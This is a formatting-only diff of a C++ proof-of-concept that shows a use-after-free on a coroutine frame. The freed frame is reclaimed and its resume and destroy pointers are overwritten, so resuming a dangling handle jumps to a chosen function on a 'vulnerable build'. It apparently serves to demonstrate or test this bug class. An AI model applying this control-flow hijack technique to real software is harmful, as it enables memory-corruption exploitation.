@@ -30,7 +30,7 @@ int main() {
 
     // 1. Victim creates and parks a coroutine.
     Task t = worker();
-    t.handle.resume(); // parked at the co_await
+    t.handle.resume();  // parked at the co_await
     void *frame = t.handle.address();
     size_t sz = chunk_size(frame);
     fprintf(stderr,
@@ -40,9 +40,9 @@ int main() {
             frame_resume(frame));
 
     // 2. BUG: the frame is destroyed (freed) but a handle to it is kept.
-    auto dangling = t.handle; // stale copy of the handle
-    t.handle = nullptr;       // stop ~Task from destroying again
-    dangling.destroy();       // frame chunk returns to the allocator
+    auto dangling = t.handle;  // stale copy of the handle
+    t.handle = nullptr;        // stop ~Task from destroying again
+    dangling.destroy();        // frame chunk returns to the allocator
     fprintf(stderr,
             "[VICTIM] (bug) frame freed; dangling handle still held\n");
 
@@ -55,14 +55,14 @@ int main() {
             reclaim == frame ? "(== freed frame, reclaimed)"
                              : "(did NOT reclaim!)");
     void *tgt = (void *)&hijack_target;
-    memcpy(reclaim + 0, &tgt, 8); // fake resume_fn
-    memcpy(reclaim + 8, &tgt, 8); // fake destroy_fn
+    memcpy(reclaim + 0, &tgt, 8);  // fake resume_fn
+    memcpy(reclaim + 8, &tgt, 8);  // fake destroy_fn
     fprintf(stderr,
             "[ATTACKER] planted hijack_target in reclaimed frame[0]/[8]\n");
 
     // 4. Victim resumes the dangling handle -> indirect call through frame[0].
     fprintf(stderr, "[VICTIM] resuming dangling handle...\n");
-    dangling.resume(); // -> hijack_target on the vulnerable build
+    dangling.resume();  // -> hijack_target on the vulnerable build
 
     fprintf(
         stderr,
